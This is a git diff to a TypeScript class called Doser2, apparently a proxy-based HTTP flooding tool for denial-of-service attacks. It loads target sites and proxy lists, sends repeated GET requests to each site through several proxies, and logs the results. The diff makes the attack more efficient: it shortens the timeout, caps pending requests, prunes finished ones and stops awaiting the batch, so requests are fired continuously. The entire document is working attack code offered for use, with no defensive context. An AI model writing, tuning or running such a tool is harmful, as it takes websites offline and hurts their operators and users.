@@ -1,5 +1,6 @@
 import axios from 'axios-https-proxy-fix'
 import { EventEmitter } from 'events'
+import _ from "lodash";
 
 interface ProxyData {
   ip: string;
@@ -22,6 +23,7 @@ export class Doser2 {
   private loadedTargetsAndProxies: TargetsData | null = null;
   private targetsAndProxiesInterval?: NodeJS.Timer;
   private tickInterval?: NodeJS.Timer;
+  // private compactRequestsArrayInterval?: NodeJS.Timer;
 
   // Attack settings
   private onlyProxy = true;
@@ -29,6 +31,7 @@ export class Doser2 {
   private tickingIntervalTime = 60;
   private attacksPerSite = 10; //Attacks per site from different proxies
   private randomStartTimeInterval = 100; // Setting used when you create many instances, additional interval before start
+  private maxRequestCount = 1000;
 
   private requestsPromises: Array<any> = [];
 
@@ -43,6 +46,11 @@ export class Doser2 {
     this.targetsAndProxiesInterval = setInterval(() => {
       this.updateTargetsAndProxies();
     }, 300000)
+
+    // //Clear all false values(null, undefine, .etc)
+    // this.compactRequestsArrayInterval = setInterval(() => {
+    //   this.requestsPromises = _.compact(this.requestsPromises);
+    // }, 10000);
   }
 
   private updateTargetsAndProxies() {
@@ -51,6 +59,14 @@ export class Doser2 {
         this.loadedTargetsAndProxies = data
       })
       .catch(() => console.log('Unable to update data'))
+  }
+
+  /**
+   * Remove requests that finished its work
+   * @private
+   */
+  private clearRequests() {
+    this.requestsPromises = _.compact(this.requestsPromises);
   }
 
   forceProxy (newVal: boolean) {
@@ -98,6 +114,12 @@ export class Doser2 {
 
   async tick() {
     if(!this.loadedTargetsAndProxies) {
+      console.log('No target or proxies')
+      return;
+    }
+    if(this.requestsPromises.length >= this.maxRequestCount) {
+      console.log('Max count of pending requests reached: ', this.requestsPromises);
+      this.clearRequests();
       return;
     }
 
@@ -121,7 +143,7 @@ export class Doser2 {
           const promise = axios.get(
             randomSite.page,
             {
-              timeout: 5000,
+              timeout: 2000,
               validateStatus: () => true,
               proxy: {
                 host: proxyIP,
@@ -134,6 +156,8 @@ export class Doser2 {
             }
           );
 
+          const promiseIndex = this.requestsPromises.push(promise) - 1;
+
           // Show some stats about it
           promise
             .then(result => {
@@ -143,14 +167,11 @@ export class Doser2 {
               }
             }).catch((e) => {
               console.log(`Fail: ${randomSite.page} | ${e.code}`);
-            })
-
-          this.requestsPromises.push(promise);
+            }).finally(() => {
+              this.requestsPromises[promiseIndex] = undefined;
+          });
         }
       }
-
-      // Execute all requests
-      await Promise.all(this.requestsPromises);
 
       console.log('Request count: ', this.requestsPromises.length);
 
